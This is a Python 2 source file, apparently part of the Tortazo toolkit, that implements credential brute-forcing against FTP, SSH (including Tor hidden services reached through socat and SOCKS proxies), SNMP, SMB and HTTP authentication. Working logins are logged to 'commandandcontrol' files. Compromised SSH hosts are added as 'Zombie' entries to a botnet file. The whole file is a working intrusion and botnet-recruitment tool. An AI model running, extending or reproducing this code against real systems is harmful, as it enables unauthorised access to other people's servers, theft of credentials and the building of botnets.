# coding=utf-8
'''
Created on 09/07/2014

#Author: Adastra.
#twitter: @jdaanial

ServiceConnector.py

ServiceConnector is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

ServiceConnector is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Tortazo; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
'''

from pysnmp.entity.rfc3413.oneliner import cmdgen
import paramiko
import ftplib
import os
import sys
from smb.SMBConnection import SMBConnection
import logging as log
import requests


class ServiceConnector():

    def startSocatTunnel(self, tcpListen,hiddenServiceAddress,hiddenServicePort, socksPort='9150'):
        from subprocess import Popen, PIPE, STDOUT
        cmd = os.getcwd()+'/plugins/utils/socat/socat TCP4-LISTEN:%s,reuseaddr,fork SOCKS4A:127.0.0.1:%s:%s,socksport=%s' %(tcpListen,hiddenServiceAddress,hiddenServicePort,socksPort)
        process = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE, close_fds=True)
        print process.pid
        return process

    def anonymousFTPAccess(self,host, port):
        try:
            ftpFileName = 'commandandcontrolftp.txt'
            ftpClient = ftplib.FTP()
            ftpClient.connect(host, port)
            ftpClient.login()
            print "[+] Anonymous access allowed in: %s Go for it!" %(host)
            ftpFile = open(ftpFileName, 'a')
            entry = '%s:%s:%s' %(host, 'anonymous', 'anonymous')
            ftpFile.write(entry+'\n')
            ftpFile.close()
        except:
            print "[-] Anonymous access is not allowed in: %s "%(host)
            return False
        return True

    def performFTPConnection(self, host, port, user, passwd):
        ftpFileName = 'commandandcontrolftp.txt'
        try :
            sessionFtp = ftplib.FTP()
            sessionFtp.connect(host=host, port=port)
            success = sessionFtp.login(user, passwd)
            if success:
                ftpFile = open(ftpFileName, 'a')
                print "[+] FTP Connection Success ... "
                sessionFtp.quit()
                sessionFtp.close()
                entry = '%s:%s:%s' %(host, user, passwd)
                ftpFile.write(entry+'\n')
                ftpFile.close()
                return True
        except ftplib.socket.gaierror as sockerror:
            print "An error ocurred. See the full trace: "
            print sys.exc_info()
            raise sockerror
        except ftplib.all_errors, e:
            errorcode_string = str(e).split(None, 1)
            print errorcode_string
            if errorcode_string[0] == '530':
                if "Login" in errorcode_string[1]:
                    return False


    def performSSHConnection(self, host, port, user, passwd, brute=False):
        '''
        Perform SSH Connections using the tortazo_botnet.bot file.
        '''
        self.cli.logger.basicConfig(format="%(levelname)s: %(message)s", level=log.WARN)
        tortazoFile = os.getcwd()+'/tortazo_botnet.bot'
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        sshFileName = 'commandandcontrolssh.txt'
        try:
            client.connect(host, port, username=user, password=passwd)
        except paramiko.AuthenticationException:
            return False
        except paramiko.SSHException as sshExc:
            print "Seems that the SSH Service is not running..."
            raise sshExc
        except Exception as exc:
            print "An error ocurred. See the full trace: "
            print sys.exc_info()
            raise exc
        if client:
            print "[+] SSH Connection Success ... "
            client.close()
            sshFileName = os.getcwd()+'/commandandcontrolssh.txt'
            if os.path.exists(sshFileName) == False:
                sshFile = open(sshFileName, 'w')
            else:
                sshFile = open(sshFileName, 'a')
            entry =  '%s:%s:%s' %(host, user, passwd)
            sshFile.write(entry+'\n')
            sshFile.close()
            if brute:
                print "[+] Updating the file 'tortazo_botnet.bot' with the new Zombie"
                if os.path.exists(tortazoFile) == False:
                    tortazoFd = open(tortazoFile, 'w')
                else:
                    tortazoFd = open(tortazoFile, 'a')
                #host:user:pass:port:nickname
                nickname = '--'
                for torNode in self.torNodes:
                    if torNode.host == host:
                        nickname = torNode.nickName
                        break
                entryBotnet = '%s:%s:%s:%s:%s' %(host, user, passwd, port, nickname)
                content = open(tortazoFile, 'r').readlines()
                if entryBotnet in content:
                    print "[-] Entry duplicated. Server already added in the 'tortazo_botnet.bot' file"
                else:
                    tortazoFd.write(entryBotnet+'\n')
                    print "[+] Entry %s added" %(entry)
                    tortazoFd.close()
            return True

    def performSSHConnectionHiddenService(self, onionService, port, user, passwd):
        self.cli.logger.basicConfig(format="%(levelname)s: %(message)s", level=self.cli.logger.ERROR)
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        proxyCommand = os.getcwd()+'/plugins/connect-socks -S '+self.socksHost+':'+str(self.socksPort)+' '+onionService+' '+str(port)
        proxy = paramiko.ProxyCommand(proxyCommand)
        try:
            # IF Hidden Service is incorrect: SSHException: Error reading SSH protocol banner
            # IF Bad user/passwd: AuthenticationException:
            # IF Bad Proxy: ProxyCommandFailure:

            client.connect(onionService, port, username=user, password=passwd, sock=proxy)
        except paramiko.AuthenticationException:
            return False
        except paramiko.ProxyCommandFailure as proxyExc:
            print "Proxy Failure. The settings used are: Host=%s and Port=%s. Check your TOR Socks proxy if you haven't used the options -T and -U." %(self.socksHost,self.socksPort)
            raise proxyExc
        except paramiko.SSHException as sshExc:
            print "Seems that the Hidden Service is not running. Please, check that before running the bruteforce attack."
            raise sshExc
        except Exception as exc:
            print "An error ocurred. See the full trace: "
            print sys.exc_info()
            raise exc

        if client:
            print "[+] SSH Connection Success ... "
            sshFileName = os.getcwd()+'/commandandcontrolssh.txt'
            if os.path.exists(sshFileName) == False:
                sshFile = open(sshFileName, 'w')
            else:
                sshFile = open(sshFileName, 'a')
            entry =  '%s:%s:%s' %(onionService, user, passwd)
            sshFile.write(entry+'\n')
            sshFile.close()
            client.close()

    def performSNMPConnection(self, host, port=161, community='public'):
        snmpCmdGen = cmdgen.CommandGenerator()
        print "[+] Trying community name: %s " %(community)
        snmpTransportData = cmdgen.UdpTransportTarget((host, port))
        mib = cmdgen.MibVariable('SNMPv2-MIB', 'sysName', 0)
        error, errorStatus, errorIndex, binds = snmpCmdGen.getCmd(cmdgen.CommunityData(community), snmpTransportData, mib)

        if error:
            # Check for errors and print out results
            return False
        else:
            print "[*] SNMP Success ... community name: %s " % (community)
            return True

    def performSMBConnection(self, host, port, user, passwd):
        import socket
        client_name =socket.gethostname()
        smbClient = SMBConnection(user, passwd, client_name, "", use_ntlm_v2 = True)
        if smbClient.connect(host, port):
            print "[+] SMB Connection Success ... "
            print "[+] Listing the Shared resources"
            for share in smbClient.listShares():
                print "[*][*] Resource name: %s " %(share.name)
            return True
        else:
            return False


    def performHTTPAuthConnection(self, url, user, passwd):
        initialResponse = requests.get(url)
        for header in initialResponse.headers:
            print header + " - " + initialResponse.headers[header]
        if initialResponse.status_code == 401:
            if 'www-authenticate' in initialResponse.headers and 'Digest' in initialResponse.headers['www-authenticate']:
                #Digest Auth.
                print "[+] Header 'www-authenticate' in response. Digest Authentication requested by the server."
                from requests.auth import HTTPDigestAuth
                res = requests.get(url, auth=HTTPDigestAuth(user, passwd))
            elif 'www-authenticate' in initialResponse.headers and 'Basic' in initialResponse.headers['www-authenticate']:
                #Basic Auth.
                print "[+] Header 'www-authenticate' in response. Basic Authentication requested by the server."
                from requests.auth import HTTPBasicAuth
                res = requests.get(url, auth=HTTPBasicAuth(user, passwd))
            if res and res.status_code == 200:
                print "[+] HTTP Auth Connection Success ... "
                return True
            else:
                return False